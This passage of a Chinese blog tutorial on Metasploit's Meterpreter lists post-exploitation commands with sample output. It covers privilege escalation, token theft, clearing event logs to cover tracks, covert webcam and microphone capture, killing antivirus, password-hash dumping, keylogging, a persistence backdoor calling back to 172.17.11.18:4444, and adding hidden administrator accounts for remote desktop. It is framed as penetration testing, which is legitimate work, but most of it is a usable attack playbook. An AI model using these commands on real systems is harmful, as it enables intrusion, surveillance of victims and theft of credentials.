<p>ps#列出正在运行的进程</p>
<p>kill pid # 杀死进程</p>
<p>migrate pid # 将<span lang="EN-US">Meterpreter</span>会话移植到进程数为pid的进程中,需要注意的是如果存在杀软的话可能会阻止进程注入，所以把会话进程注入到<span lang="EN-US">svchost.exe</span>是一个好方法</p>
<p>getprivs#尽可能获取尽可能多的特权</p>
<p>getuid #获得当前的权限</p>
<p>getsystem #通过各种攻击向量将一个管理帐户（通常为本地<span lang="EN-US">Administrator</span>账户）提升为本地SYSTEM帐户</p>
<p>getsystem –h #升级权限SYSTEM账户</p>
<p>使用<span lang="EN-US">MS14-058</span>之类的Exp进行提权:</p>
<p>meterpreter &gt; background</p>
<p>[*] Backgrounding session 3..</p>
<p>msf exploit(handler) &gt; use
exploit/windows/local/ms14_058_track_popup_menu</p>
<p>msf exploit(ms14_058_track_popup_menu) &gt;
set SESSION 3</p>
<p>use priv#加载特权提升扩展模块，来扩展Meterpreter库</p>

</div>
<p>&nbsp;</p>
<p>列出远程机器的进程和进程ID方便迁移我们的进程，进而改变我们的权限。使用“<span lang="EN-US&gt;">ps</span>”命令。</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/204651752.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025521537-532920416.gif" alt="" width="630" height="357" border="0"></a></p>
<p>在得到的进程列表后，可以实现迁移进程，用getpid查看当前进程号，然后根据上图既可以知道当前的权限，若再用<span lang="EN-US&gt;">migrate+pid</span>，就会迁移到另一个进程中，然后我们的权限就改变了。</p>
<p><a href="http://blog.51cto.com/attachment/201301/204808980.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025521833-417713919.gif" alt="" width="549" height="84" border="0"></a></p>
<p><a href="http://image.3001.net/images/20171121/15112656607328.png" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025522066-1816048741.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="59" border="0"></a></p>
<p><span lang="EN-US">14.</span>盗取令牌</p>
<div>
<p>meterpreter &gt;use incognito&nbsp;&nbsp;&nbsp; 加载<span lang="EN-US">incoginto</span>功能（用来盗窃目标主机的令牌或是假冒用户<span lang="EN-US">)</span></p>
<p>meterpreter &gt;list_tokens -u&nbsp;&nbsp;&nbsp; 列出目标主机用户的可用令牌</p>
<p>meterpreter &gt;list_tokens -g&nbsp;&nbsp;&nbsp; 列出目标主机用户组的可用令牌</p>
<p>meterpreter &gt;impersonate_token
DOMAIN_NAME\\USERNAME&nbsp;&nbsp;&nbsp; 假冒目标主机上的可用令牌,如meterpreter &gt; impersonate_token
QLWEB\\Administrato</p>
<p>meterpreter &gt;execute -f cmd.exe -i -t #调用域权限shell</p>
<p>meterpreter &gt; getuid</p>
<p>meterpreter&gt;add_user 0xfa funny –h192.168.3.98&nbsp; #在域控主机上添加账户</p>
<p>meterpreter&gt;reg command&nbsp;&nbsp; # 在目标主机注册表中进行交互，创建，删除，查询等操作</p>
<p>meterpreter&gt;setdesktop number&nbsp;&nbsp; #切换到另一个用户界面（该功能基于哪些用户已登录）</p>
<p>meterpreter&gt;ps #查看目标机器进程，找出域控账户运行的进程<span lang="EN-US">ID</span></p>
<p>meterpreter&gt;steal_token pid #盗窃给定进行的可用令牌并进行令牌假冒</p>
<p>meterpreter&gt;drop_token pid #停止假冒当前令牌</p>
<p>&nbsp;</p>

</div>
<p>&nbsp;</p>
<p>另一个提权的方法是扮演一个帐户从一个特定进程偷取令牌。为此，我们需要“incognito”扩展，使用“<span lang="EN-US&gt;">steal_token+PID</span>”这个例子中我们使用的是steal_token 640，其中由前面执行<span lang="EN-US&gt;">ps</span>后得到的信息可知，PID为640的权限为<span lang="EN-US&gt;">administrator</span>，所以我们在执行命令后虽然提示错误信息，但是它仍会被成功在后台执行，所以在运行<span lang="EN-US&gt;">steal_token</span>后核实UID，我们的权限就变为了<span lang="EN-US&gt;">administrator</span>了。</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/205418940.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025522477-1093986046.gif" alt="" width="587" height="91" border="0"></a></p>
<div>
<p>load incognito</p>
<p>list_tokens -u</p>
<p>impersonate_token xxxxx\\xxxxxxx</p>
<p>execute -f cmd.exe -i -t</p>

</div>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025523204-422095693.gif" alt="20161006131139" width="554" height="336"></p>
<p><span lang="EN-US">15.</span>清除事件日志</p>
<p>完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令“<span lang="EN-US&gt;">clearev</span>”命令来清除事件日志</p>
<p>执行“clearev”命令，将清除事件日志。这个命令没有任何选项或参数。</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/205448912.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025523588-911056691.gif" alt="" width="532" height="80" border="0"></a></p>
<p>执行“clearev”命令后打开目标机器的事件查看器里面的应用程序、安全性、系统都是是空的：</p>
<p><a href="http://blog.51cto.com/attachment/201301/205505534.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025524075-715674220.gif" alt="" width="518" height="345" border="0"></a></p>
<p>&nbsp;</p>
<p><span lang="EN-US">16.</span>网络摄像头</p>
<div>
<p>record_mic　　　<span lang="EN-US"> #</span>音频录制</p>
<p>webcam_chat　　　<span lang="EN-US">#</span>查看摄像头接口</p>
<p>webcam_list　　　<span lang="EN-US">#</span>查看摄像头列表</p>
<p>webcam_stream　　<span lang="EN-US">#</span>摄像头视频获取</p>
<p>webcam_list</p>
<p>meterpreter &gt; webcam_list</p>
<p>1: Creative WebCam NX Pro</p>
<p>2: Creative WebCam NX Pro (VFW)</p>
<p>meterpreter &gt;</p>
<p>webcam_snap</p>
<p>meterpreter &gt; webcam_snap -h</p>
<p>Usage: webcam_snap [options]</p>
<p>OPTIONS:</p>
<p>&nbsp;&nbsp;&nbsp; -h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Help Banner</p>
<p>&nbsp;&nbsp;&nbsp; -i
&gt;opt&gt;&nbsp; The index of the webcam to
use (Default: 1)</p>
<p>&nbsp;&nbsp;&nbsp; -p
&gt;opt&gt;&nbsp; The JPEG image path
(Default: 'gnFjTnzi.jpeg')</p>
<p>&nbsp;&nbsp;&nbsp; -q
&gt;opt&gt;&nbsp; The JPEG image quality
(Default: '50')</p>
<p>&nbsp;&nbsp;&nbsp; -v
&gt;opt&gt;&nbsp; Automatically view the JPEG
image (Default: 'true')</p>
<p>meterpreter &gt;</p>
<p>OPTIONS:</p>
<p>-h:&nbsp;&nbsp;&nbsp; Displays the
help information for the command</p>
<p>-i opt:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If
more then 1 web cam is connected, use this option to select the device to
capture the</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; image from</p>
<p>-p opt:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Change
path and filename of the image to be saved</p>
<p>-q opt:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The
imagine quality, 50 being the default/medium setting, 100 being best quality</p>
<p>-v opt:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; By
default the value is true, which opens the image after capture</p>
<p>Example usage:</p>
<p>meterpreter &gt; webcam_snap -i 1 -v false</p>
<p>[*] Starting...</p>
<p>[+] Got frame</p>
<p>[*] Stopped</p>
<p>Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg</p>
<p>meterpreter &gt;</p>

</div>
<p>“webcam_snap”命令为抓取目标主机当前的摄像头拍摄到的画面，并将它以图片形式保存到本地，<span lang="EN-US&gt;">“webcam_snap –h”</span>命令为查看参数的使用方法。由于我们的实验中目标机器没有摄像头，所以我们运行<span lang="EN-US&gt;">“webcam_snap -i 1 -v false”</span>命令之后返回以下信息。</p>
<p><a href="http://blog.51cto.com/attachment/201301/210451895.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025524747-1503549059.gif" alt="" width="538" height="244" border="0"></a></p>
<p>&nbsp;</p>
<p><span lang="EN-US&gt;"><a title="&quot;Center&quot;" href="https://www.offensive-security.com/wp-content/uploads/2015/05/Webcam_snap.png"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025525584-244131491.gif" alt="Using webcam_snap Meterpreter plugin | Metasploit Unleashed" width="568" height="491" border="0"></a></span></p>
<p><span lang="EN-US">17.</span>一些脚本命令</p>
<p>为获取远程机器上的信息，在meterpreter中还有很多脚本可用，做更大的渗透测试。</p>
<p>使用“run scriptname”来使用<span lang="EN-US&gt;">meterpreter</span>模块中的脚本命令</p>
<p>(1)调用post/windows/gather/checkvm后渗透模块，确定目标主机是否是一台虚拟机</p>
<p>命令：</p>
<p>run&nbsp;
post/windows/gather/checkvm</p>
<p>效果如下图：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025525901-1405844404.gif" alt="" width="516" height="98"></p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/210652303.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025526139-2122578152.gif" alt="" width="442" height="58" border="0"></a></p>
<p>同样有许多类似这样的脚本，下面来介绍几个重要的脚本：</p>
<p>(2) packetrecorder——“run packetrecorder”查看目标系统的所有网络流量，并且进行数据包记录，<span lang="EN-US&gt;">-i 1</span>指定记录数据包的网卡。</p>
<p>从下图中运行之后返回的信息中可以到我们需要查看的目标系统的网络流量信息将被存储的路径，可以到下面路径中直接查看。</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/210843385.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025526561-148295478.gif" alt="" width="619" height="95" border="0"></a></p>
<p>(3)get_local_subnets——“run get_local_subnets”得到本地子网网段</p>
<p><a href="http://blog.51cto.com/attachment/201301/210859129.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025526861-247449583.gif" alt="" width="416" height="51" border="0"></a></p>
<p>(4)getcountermeasure—run getcountermeasure显示HIPS和<span lang="EN-US&gt;">AV</span>进程的列表，显示远程机器的防火墙规则，列出DEP和<span lang="EN-US&gt;">UAC</span>策略</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/211515260.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025527508-1408864389.gif" alt="" width="589" height="349" border="0"></a></p>
<p>(5) scraper——“run scraper”从目标主机获得所有网络共享等信息</p>
<p>并且获得的这些所有这些信息都存储在/root/.msf4/logs/scripts/scraper
directory目录下。使用ls命令查看存储的这些文件。</p>
<p><a href="http://blog.51cto.com/attachment/201301/211335625.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025528019-835896384.gif" alt="" width="593" height="166" border="0"></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/211616826.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025528493-857423779.gif" alt="" width="599" height="128" border="0"></a></p>
<p>(6) killav——“run killav”命令终止Av进程，可以很快的清除我们的路径和有效渗透测试的记录</p>
<p>但是这个脚本,不能绝对得逃避杀毒软件，但是如果成功了对被攻击者会是一个严重的打击，对他造成很大的困扰</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/211629324.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025528724-876522895.gif" alt="" width="420" height="38" border="0"></a></p>
<p>使用了 “run killav”命令后<span lang="EN-US&gt;">xp</span>会终止Av进程然后弹出窗口：</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/211642285.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025529165-1603667756.gif" alt="" width="471" height="191" border="0"></a></p>
<p>(7)hashdump——“run hashdump”获得密码哈希值</p>
<p>运行这个脚本和在meterpreter下直接运行<span lang="EN-US&gt;">hashdump</span>结果差不多。</p>
<p><a href="http://blog.51cto.com/attachment/201301/211655906.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025529791-900583689.gif" alt="" width="554" height="245" border="0"></a></p>
<p>(8)keylogrecorder——“run keylogrecorder”命令为记录键盘信息</p>
<p>运行这个脚本和在meterpreter下直接运行<span lang="EN-US&gt;">keyscan</span>结果差不多，这里将对键盘记录的文件进行保存，路径如下。</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/211708139.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025530373-1128652177.gif" alt="" width="554" height="172" border="0"></a></p>
<p>(9) persistence——“run persistence”这个脚本可以被用作持续欺骗主机<span lang="EN-US">&nbsp;&nbsp;&nbsp; </span></p>
<p>远程主机重启后将在特定的时间间隔保持meterpreter会话</p>
<p>run&nbsp; persistence -X -i&nbsp; 5&nbsp; -p
4444 -r 172.17.11.18&nbsp;&nbsp; #植入后门</p>
<p>-X 在目标主机上开机自启动</p>
<p>-i&nbsp; 不断尝试反向连接的时间间隔</p>
<p>persistence后渗透模块向目标主机植入后门程序</p>
<p>效果如下图：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025530903-2135865795.gif" alt="" width="554" height="228"><br>执行过程：</p>
<p>创建攻击载荷-&gt;攻击载荷植入到目标主机<span lang="EN-US&gt;">c:\windows\temp</span>目录下，是一个.vbs的脚本<span lang="EN-US&gt;">-&gt;</span>写目标主机注册表键值实现开机自动运行。<br>下图，在攻击主机上监听4444端口，等待反弹会话成功</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025531476-2044278912.gif" alt="" width="554" height="252"></p>
<p>下图，看目标主机注册表Run键值果然被写入了一个<span lang="EN-US&gt;">pDTizIlNK</span>的键值，执行后门vbs脚本<span lang="EN-US&gt;"><br><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025531856-360429167.gif" alt="" width="554" height="224"></span></p>
<p>&nbsp;</p>
<p>(10)enum_drives</p>
<p>这个后渗透攻击模块是获取目标主机磁盘分区信息，我们就以这个例讲解后渗透攻击模块使用方法。</p>
<p>后渗透模块<span lang="EN-US&gt;">post/windows/gather/forensics/enum_drives</span>调用</p>
<p>在获取<span lang="EN-US&gt;">meterpreter</span>会话session后，调用<span lang="EN-US&gt;">post/windows/gather/forensics/enum_drives</span>，可获取目标主机存储器信息：</p>
<p>命令，在<span lang="EN-US&gt;">msfconsole</span>下：</p>
<p>use
post/windows/gather/forensics/enum_drives</p>
<p>set SESSION
1</p>
<p>exploit</p>
<p>效果如图：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025532420-1810078060.gif" alt="" width="554" height="336"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025532857-1204061925.gif" alt="" width="553" height="203"><br>或直接在<span lang="EN-US&gt;">meterpreter</span>会话中以命令run&nbsp;post/windows/gather/forensics/enum_drives调用</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025533398-73363372.gif" alt="" width="553" height="220"></p>
<p>我们首先将<span lang="EN-US&gt;">meterpreter</span>会话放入后台，然后搜索我们的模块。</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025533972-906692234.gif" alt="" width="553" height="373"></p>
<p>然后使用<span lang="EN-US&gt;">use</span>命令来使用模块，然后设置一下会话id，接着执行，可以发现成功获取到目标主机磁盘分区的信息。</p>
<p><span lang="EN-US">18.SOCKS</span>代理</p>
<p>Metasploit可以作为一个SOCKS代理服务器，具体步骤为首先通过<span lang="EN-US&gt;">Metasploit</span>的某些模块建立会话，就像本章前面介绍的，建立完会话之后，执行“route
add +IP+mask+SID”，本例中我们路由的ip网段为10.1.1.0，然后使用“<span lang="EN-US&gt;">use auxiliary/server/socks4a</span>”命令来使用sock4a模块，执行<span lang="EN-US&gt;">run</span>命令 ，socks便会执行</p>
<p>然后再在命令行下执行proxychains命令，使用代理对目标主机进行扫描，<span lang="EN-US&gt;">nmap</span>，nc等都可以，此例子中我们对目标机<span lang="EN-US&gt;">10.1.1.130</span>的445端口进行扫描。从返回给我们的结果可以看到，我们的代理已经设置成功。</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/211944479.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025534929-386716291.gif" alt="" width="599" height="393" border="0"></a></p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/212006268.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025535280-149336405.gif" alt="" width="542" height="67" border="0"></a></p>
<p>&nbsp;</p>
<p><span lang="EN-US">19.</span>运行程序</p>
<p>我们还可以使用“execute”命令在目标系统中执行应用程序。这个命令的使用方法如下：</p>
<div>
<p>execute -f&lt;file&gt; [Options]</p>
<p>execute -f cmd.exe -i#执行<span lang="EN-US">cmd.exe</span>命令并进行交互</p>
<p>execute -f cmd.exe -i -t#以所有可用令牌来执行<span lang="EN-US">cmd</span>命令</p>
<p>execute -f cmd.exe -i -H -t#创建新进程cmd.exe，-H不可见，-i交互</p>
<p>execute -H -i -f cmd.exe </p>
<p>execute&nbsp; -H -m -d
notepad.exe-f&nbsp; wce.exe -a "-o
wce.txt"</p>

</div>
<p>运行后它将执行file参数所指定的文件。可选参数如下：</p>
<p>-H：创建一个隐藏进程</p>
<p>-a：传递给命令的参数</p>
<p>-i：跟进程进行交互</p>
<p>-m：从内存中执行</p>
<p>-t：使用当前伪造的线程令牌运行进程</p>
<p>-s：在给定会话中执行进程</p>
<p>-f 执行的程序文件</p>
<p>-d 在目标主机执行时显示的进程名称（用以伪装）</p>
<p>-o wce.txt"是wce.exe的运行参数</p>
<p><a href="http://image.3001.net/images/20171121/15112657306025.png" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025536100-225251154.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="330" border="0"></a></p>
<p><span lang="EN-US">20.</span>创建账号</p>
<p>getgui——getgui&nbsp;，为添加用户的命令，首先用“<span lang="EN-US&gt;">run getgui -h</span>”查看脚本getgui的帮助信息</p>
<p>run&nbsp; getgui-e #开启远程桌面</p>
<p>run&nbsp; getgui -uexample_username -pexample_password #添加账号</p>
<p>调用getgui后渗透攻击模块</p>
<p>作用：开启目标主机远程桌面，并可添加管理员组账号</p>
<p>命令：</p>
<p>run&nbsp; getgui&nbsp; -e</p>
<p>开启目标主机远程桌面</p>
<p>如下图：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025536549-1133925024.gif" alt="" width="554" height="171"><br>开启目标主机的远程桌面服务后，可以添加账号以便利用</p>
<p>命令：</p>
<p>run&nbsp; getgui&nbsp;-u&nbsp;
example_username&nbsp;-p&nbsp; example_password</p>
<p>如下图：<span lang="EN-US&gt;"><br><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025537064-740496480.gif" alt="" width="644" height="222"><br></span>执行成功，可以使用kali的rdesktop命令使用远程桌面连接目标主机</p>
<p>rdesktop&nbsp;
-u&nbsp;kali&nbsp; -p&nbsp;meterpreter&nbsp; 192.168.250.176:3389</p>
<p><a href="http://blog.51cto.com/attachment/201301/210706951.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025537546-607006938.gif" alt="" width="540" height="235" border="0"></a></p>
<p>从上图可以看出这个脚本的用法是“rungetgui –u username –p
password”，我添加了一个lu的用户密码为6666。从下图中可以看到用户已经添加成功。</p>
<p><a href="http://blog.51cto.com/attachment/201301/210732344.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025538041-335381243.gif" alt="" width="613" height="146" border="0"></a></p>
<p>添加完账户之后使用rdesktop命令连接一下远程主机，具体用法是“<span lang="EN-US&gt;">rdesktop –u username –p password IP</span>”执行命令之后就会弹出一个窗口，只需再输入一次密码就可以进入目标机器，并对目标机器直接进行控制。</p>
<p><a href="http://blog.51cto.com/attachment/201301/210752188.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025538761-467376011.gif" alt="" width="554" height="410" border="0"></a></p>
<p>接下来，我们可以在目标系统中创建一个新的用户账号（getgui脚本，使用<span lang="EN-US&gt;">-u</span>和-p参数），并给它分配管理员权限（使用），然后将其添加到”远程桌面用户”组中。</p>
<p><a href="http://image.3001.net/images/20171121/15112658182961.png" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025539180-809203738.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="124" border="0"></a></p>
<p><a href="http://image.3001.net/images/20171121/15112658282818.png" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025539706-986024207.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="399" height="257" border="0"></a></p>
<p>当然了，你也可以尝试将这个新添加的用户Hacker在<span lang="EN-US&gt;">Windows</span>登录界面中隐藏。</p>
<p><span lang="EN-US">21.</span>启用远程桌面</p>
